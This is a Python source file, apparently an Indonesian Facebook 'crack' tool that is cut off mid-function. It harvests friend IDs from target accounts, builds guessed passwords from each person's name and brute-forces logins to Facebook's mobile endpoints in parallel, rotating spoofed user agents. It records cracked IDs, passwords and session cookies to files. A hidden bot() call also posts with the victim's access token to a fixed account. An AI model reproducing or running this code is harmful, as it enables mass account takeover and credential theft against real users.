###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,rich,bs4,stdiomask
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep
from rich import print as ketik
from rich.panel import Panel as tabel
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from time import time as DeltaTimer
from rich.tree import Tree
from rich import print as prints
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
###----------[ GLOBAL NEM ]----------###
loop,ok,cp = 0,0,0
ugen = []
tokenku = []
id = []
uid = []
id2 = []
todeo = []
akun = []
ses = requests.Session()
###----------[ USER-AGENT-GACOR ]----------###
for ua in range(10000):
    rr = random.randint
    rc = random.choice
    andro = rc(["6.0","8.1.0","5.1.1"])
    gt = rc(["AQUARIUS Cmp NS208","Aquarius Cmp NS55A","Aquarius CMP NE145","Aquarius Pro, Std, Elt Series"])
    clay = f"Mozilla/5.0 (Linux; Android {andro}; {gt}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(81,95))}.0.{str(rr(4044,4638))}.{str(rr(74,138))} Mobile Safari/537.36"
    fri3nds = random.choice([clay])
    ugen.append(fri3nds)
###----------[ WARNA ]----------###
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
B = '\x1b[0;34m'  # BIRU +
p = '\x1b[1;97m'  # PUTIH +
#---[ CONVERTER ]---#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#---[ BANNER GW ]---###
def logo():
	print(f'''{h}██╗░░░░░██╗░░██╗██╗░░░██╗███████╗███████╗
██║░░░░░╚██╗██╔╝╚██╗░██╔╝╚════██║╚════██║
██║░░░░░░╚███╔╝░░╚████╔╝░░░███╔═╝░░███╔═╝
██║░░░░░░██╔██╗░░░╚██╔╝░░██╔══╝░░██╔══╝░░
███████╗██╔╝╚██╗░░░██║░░░███████╗███████╗
╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚══════╝''')
#--[ LOGIN COOKIE ]--##
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print(f'Koneksi Error')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		logo()
		ketik(tabel(f'[bold green]Mohon Untuk Memasukkan Cookie Yang Fressh Agar Tidak Invalid',title=f'[bold purple][ [bold green]INFORMATION [bold purple]]',style=f'bold purple'))
		cookie=input(f'{p}Masukkan Cookie Anda : {h}')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				ketik(tabel(f"[bold red]Login Gagal, Mohon Masukkan Cookie Yang Fressh",title=f'[bold yellow][ [bold red]INFORMATION [bold yellow]]',style=f"bold yellow"))

		ketik(tabel(f"[bold green]Login Succes, Mohon Menunggu Bang",title=f"[bold purple][ [bold green]INFORMATION [bold purple]]",style=f"bold purple"));time.sleep(1)
		menu()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#---[ MENU SCRIPT ]---# 
def menu():
	os.system('clear');logo()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		ketik(tabel(f"[bold red]Cookie Kedaluarsa Bang",width=25,style=f"bold white"))
		time.sleep(2);os.system('clear')
		login()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		id = info_datafb["id"]
		ip = requests.get("http://ip-api.com/json/").json()["query"]
	except requests.exceptions.ConnectionError:
		ketik(tabel(f"[bold red]Koneksi Sangat Error",width=25,style=f"bold white"));exit()
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		ketik(tabel(f"[bold red]Akun Tumbal Terkena Checkpoint",width=25,style=f"bold white"));time.sleep(2)
		os.system('clear')
		login()
		logo()
	print(f'{p}[+] Version Script : {h}1.0')
	print(f'{p}[+] Status Script : {h}Free')
	print(f'{p}[+] Your Ip : {h}{ip}')
	print(f'{p}[+] Nama Tumbal : {h}{nama}')
	print(f'{p}[+] Id Tumbal : {h}{id}')
	ketik(tabel(f"[bold green]KALAU INGIN LAPOR BUG DAN INGIN DONASI KEPADA AUTHOR SILAHKAN HUBUNG DI WHATSAPP NOMOR : 081342791377",title=f"[bold purple][ [bold green]INFORMATION [bold purple]]",style=f"bold purple"))
	ketik(tabel(f"[bold green]1.CRACK PUBLIK\n2.CHECK RESULT\n3.GANTI COOKIES",width=35,title=f"[bold purple][ [bold green]MENU SCRIPT [bold purple]]",style=f"bold purple"))
	lxyzz = input(f"{p}>>> Pilih Menu : {h}")
	if lxyzz in ["01","1"]:
		publik()
	elif lxyzz in ["02","2"]:
		result()
	elif lxyzz in ["03","3"]:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		time.sleep(3)
		login()
	else:
		print(f'{m}>>> Seriuslah Anjing')
		time.sleep(3)
		menu()
#---[ DUMP PUBLIK MASSAL ]---#
def publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f'{p}Berapa Id Yang Mah Dicrack? : {h}'))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		ketik(tabel(f'[green]       Masukkan ID Satu Persatu! ',width=43,title=f"[bold purple][ [bold green]INFORMATION [bold purple]]",style=f"bold purple"))
		Masukan = input(f'{p}>>> Masukin ID Yang Ke '+str(bilangan)+f' : {h}')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print('');print(f"\r🔥{p}SUKSES MENGUMPULKAN {h}{len(id)}{p} ID🔥")
	      setid()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#---[ CHECK RESULT/HASIL ]---#	
def result():
	ketik(tabel(f"[bold green]1.Check Hasil Sukses\n[bold yellow]2.Check Hasil Checkpoint",width=40,title=f"[bold purple][ [bold green]HASIL RESULT [bold purple]]",style=f"bold white"))
	kz = input(f'>>> Pilih Result : {h}')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' >>> File Tidak Di Temukan ')
			time.sleep(3)
			exit()
		if len(vin)==0:
			print(' >>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{p}{x}{h} >>> {x}{p}{x} {p}Pilih Akun Yang Ingin Dicek{x} : {h}')
			try:geh = lol[geeh]
			except KeyError:
				print(' >>> Seriuslah Anjing ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' >>> File Tidak Di Temukan ')
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{k}ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}')
				nocp +=1
			input('[ Klik Enter ]')
			exit()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' >>> File Tidak Di Temukan ')
			time.sleep(4)
			exit()
		if len(vin)==0:
			print(' >>> Anda Tidak Mempunyai File Sukses')
			time.sleep(4)
			exit()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n >>> Pilih Akun Yang Ingin Dicek : {h}')
			try:geh = lol[geeh]
			except KeyError:
				print(' >>> Seriuslah Anjing ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' >>> File Tidak Di Temukan ')
				time.sleep(4)
				exit()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{h}>> ID : {cpkuni[0]} PASSWORD : {cpkuni[1]} <<')
				print(f'{h}User-Agent : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			exit()
	else:
		print(' >>> Seriuslah Anjing ')
		exit()
#---[ SETTING ID ]---#
def setid():
     rr = random.randint
     for fixx in id:
            randy = rr(0,len(id2))
            id2.insert(randy, fixx)
     setmthode()
#---[ METHODE CRACK ]---#
def setmthode():
	print('')
	ketik(tabel(f"[bold green]1.VALIDATE RAZOR UPDATE\n2.VALIDATE BRAYEN UPDATE\n3.VALIDATE ALIVINO UPDATE\n4.VALIDATE FOXDEV UPDATE",width=45,title=f"[bold purple][ [bold green]METHODE CRACK [bold purple]]",style=f"bold purple"))
	poi = input(f"{p}>>> Pilih Methode : {h}")
	if poi in ["01","1"]:
		todeo.append('lidatezor')
	elif poi in ["02","2"]:
		todeo.append('lidateyen')
	elif poi in ["03","3"]:
		todeo.append('lidatevino')
	elif poi in ["04","4"]:
		todeo.append('lidatedev')
	else:
		todeo.append('lidatedev')
	wrdlist()
#---[ WORDLIST ]---#
def wrdlist():
	global prog,des
	print('')
	awal = datetime.datetime.now()
	ketik(tabel(f"\t[bold green]SABAR, LAGI NGEHACK AKUN FACEBOOK, KALAU TERASA TIDAK ADA HASIL MODE PESAWAT",title=f"[bold purple][ [bold green]Message [bold purple]]",style=f"bold purple"))
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as skuy:
			for pokx in id2:
				idf,pmf = pokx.split('|')[0],pokx.split('|')[1].lower()
				freeze = pmf.split(' ')[0]
				pwz = []
				if len(pmf)<6:
					if len(freeze)<3:
						pass
					else:
						pwz.append(pmf)
						pwz.append(freeze+'12')
						pwz.append(freeze+'123')
						pwz.append(freeze+'1234')
						pwz.append(freeze+'12345')
						pwz.append(freeze+'123456')
						pwz.append(freeze+'321')
				else:
					if len(freeze)<3:
						pwz.append(pmf)
					else:
						pwz.append(pmf)
						pwz.append(freeze+'12')
						pwz.append(freeze+'123')
						pwz.append(freeze+'1234')
						pwz.append(freeze+'12345')
						pwz.append(freeze+'123456')
						pwz.append(freeze+'321')
				if 'lidatezor' in todeo:
					skuy.submit(kyorugi,idf,pwz)
				elif 'lidateyen' in todeo:
					skuy.submit(poomsae,idf,pwz)
				elif 'lidatevino' in todeo:
					skuy.submit(kyukpa,idf,pwz)
				elif 'lidatedev' in todeo:
					skuy.submit(hosinsul,idf,pwz,awal)
				else:
					skuy.submit(hosinsul,idf,pwz,awal)
		print('')
	ketik(tabel(f"[bold green]Crack Selesai Mamang, Sorry Gk Gacor Kyak Sc Lain",width=70,style=f"bold purple"));exit()
#---[ VALIDATE RAZOR UPDATE]---#
def kyorugi(idf,pwz):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	gaya = rc([f"{m}LXYZZ",f"{k}LXYZZ",f"{h}LXYZZ",f"{B}LXYZZ",f"{u}LXYZZ"])
	prog.update(des,description=f"{gaya}[bold purple] [[bold green]{loop}/{len(id)}[bold purple]] [[bold green]SUCCES : {ok}[bold purple]][/] [bold purple][[bold yellow]CP : [bold yellow]{cp}[bold purple]][/]")
	prog.advance(des)
	for pw in pwz:
		try:
			ua = rc(ugen)
			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': 'm.prod.facebook.com',
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': 'https://m.prod.facebook.com',
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(rr(1,5))}',
		'viewport-width': f'{str(rr(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(rr(8,14))}", "Chromium";v="{str(rr(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,14))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(4099,6099))}.{str(rr(40,120))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
	 )
			po = ses.post(f"https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID", headers=head, data=date, cookies={'cookie': cuoz}, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				ketik(tabel(f"[bold green]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}\nCOOKIE : {kuki}",title=f"[bold purple][ 🔥[bold green]MENYALA ABANGKUH[bold purple]🔥 ]",style=f"bold purple"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				ketik(tabel(f"[bold yellow]ID : {idf}\nPASSWORD : {pw}\nUA : {ua}",title=f"[bold red][ 💀[bold yellow]REDUP ABANGKUH[bold red]💀 ]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---[ VALIDATE BRAYEN UPDATE ]---#
def poomsae(idf,pwz):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	ses = requests.Session()
	gaya = rc([f"{m}LXYZZ",f"{k}LXYZZ",f"{h}LXYZZ",f"{B}LXYZZ",f"{u}LXYZZ"])
	prog.update(des,description=f"{gaya}[bold purple] [[bold green]{loop}/{len(id)}[bold purple]] [[bold green]SUCCES : {ok}[bold purple]][/] [bold purple][[bold yellow]CP : [bold yellow]{cp}[bold purple]][/]")
	prog.advance(des)
	for pw in pwz:
		try:
			ua = rc(ugen)
			ses.headers.update({'Host': 'm.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.prod.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=450x756'
			heade={'Host': 'm.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.prod.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0